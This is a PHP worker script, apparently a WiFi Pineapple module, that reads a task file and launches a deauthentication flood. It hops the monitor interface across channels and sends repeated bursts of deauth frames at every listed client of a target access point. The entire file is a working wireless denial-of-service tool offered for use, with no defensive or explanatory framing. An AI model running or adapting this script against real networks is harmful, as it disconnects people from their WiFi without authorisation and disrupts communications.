<?php
/**
 * Deauth amplifier worker - burst + channel-hop combo.
 * Usage: php deauth_amp_worker.php
 * Reads  /tmp/deauth_amp_task.json
 * Writes /tmp/deauth_amp_result.json
 *
 * For each channel: hops the monitor interface, then fires `bursts`
 * deauth rounds at every client with the given multiplier.
 */

require_once('/pineapple/modules/PineAP/api/PineAPHelper.php');

function ampUciGetRaw($key)
{
    $key = escapeshellarg($key);
    $out = array();
    exec('uci get ' . $key . ' 2>/dev/null', $out);
    return isset($out[0]) ? trim($out[0]) : '';
}

$taskFile = '/tmp/deauth_amp_task.json';
$resultFile = '/tmp/deauth_amp_result.json';

$task = json_decode(@file_get_contents($taskFile), true);
if (!is_array($task)) {
    file_put_contents($resultFile, json_encode(array('error' => 'Task file missing or invalid')));
    exit(1);
}

$bssid      = isset($task['bssid']) ? $task['bssid'] : '';
$clients    = isset($task['clients']) ? $task['clients'] : array();
$channels   = isset($task['channels']) ? $task['channels'] : array(1, 6, 11);
$multiplier = isset($task['multiplier']) ? intval($task['multiplier']) : 2;
$bursts     = isset($task['bursts']) ? intval($task['bursts']) : 3;
$interface  = isset($task['interface']) ? $task['interface'] : '';

if (empty($bssid) || empty($clients)) {
    file_put_contents($resultFile, json_encode(array('error' => 'Missing bssid/clients')));
    exit(1);
}

$helper = new \pineapple\PineAPHelper();
$summary = array(
    'totalRounds' => count($channels) * $bursts * count($clients),
    'channels' => $channels,
    'bursts' => $bursts,
    'multiplier' => $multiplier,
    'bssid' => $bssid,
    'clients' => count($clients),
);

foreach ($channels as $channel) {
    $channel = intval($channel);
    if ($channel < 1 || $channel > 165) {
        continue;
    }

    // hop channel on the monitor interface
    if (!empty($interface)) {
        exec('iw dev ' . escapeshellarg($interface) . ' set channel ' . $channel . ' 2>/dev/null');
    }

    for ($b = 0; $b < $bursts; $b++) {
        foreach ($clients as $client) {
            $mac = $client;
            if (is_array($client) && isset($client['mac'])) {
                $mac = $client['mac'];
            }
            $helper->deauth($mac, $bssid, $channel, $multiplier);
            usleep(200000);
        }
    }
}

$summary['status'] = 'completed';
file_put_contents($resultFile, json_encode($summary));
exit(0);
